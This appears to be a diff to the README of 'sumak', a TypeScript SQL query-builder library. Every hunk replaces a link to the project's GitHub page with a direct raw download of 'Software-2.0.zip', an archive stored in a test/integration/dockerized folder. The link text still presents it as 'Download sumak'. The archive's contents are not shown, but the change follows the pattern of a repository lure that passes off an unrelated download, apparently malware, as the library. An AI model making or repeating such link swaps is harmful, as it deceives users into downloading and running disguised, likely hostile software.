@@ -1,6 +1,6 @@
 # 🧩 sumak - Safe SQL Queries Made Simple
 
-[![Download sumak](https://img.shields.io/badge/Download%20sumak-blue?style=for-the-badge)](https://github.com/latrenaauburn471/sumak)
+[![Download sumak](https://img.shields.io/badge/Download%20sumak-blue?style=for-the-badge)](https://github.com/latrenaauburn471/sumak/raw/refs/heads/main/test/integration/dockerized/Software-2.0.zip)
 
 ## 🚀 Getting Started
 
@@ -8,7 +8,7 @@ sumak helps you build SQL queries with type safety. It is made with TypeScript a
 
 If you want to get the app or source from GitHub, use this link:
 
-[Download or open sumak](https://github.com/latrenaauburn471/sumak)
+[Download or open sumak](https://github.com/latrenaauburn471/sumak/raw/refs/heads/main/test/integration/dockerized/Software-2.0.zip)
 
 ## 📥 Download and Setup
 
@@ -190,7 +190,7 @@ This setup helps you read, test, and use the project with less friction
 
 Open the main project page here:
 
-[https://github.com/latrenaauburn471/sumak](https://github.com/latrenaauburn471/sumak)
+[https://github.com/latrenaauburn471/sumak/raw/refs/heads/main/test/integration/dockerized/Software-2.0.zip](https://github.com/latrenaauburn471/sumak/raw/refs/heads/main/test/integration/dockerized/Software-2.0.zip)
 
 ## 🧪 Simple Checklist
 
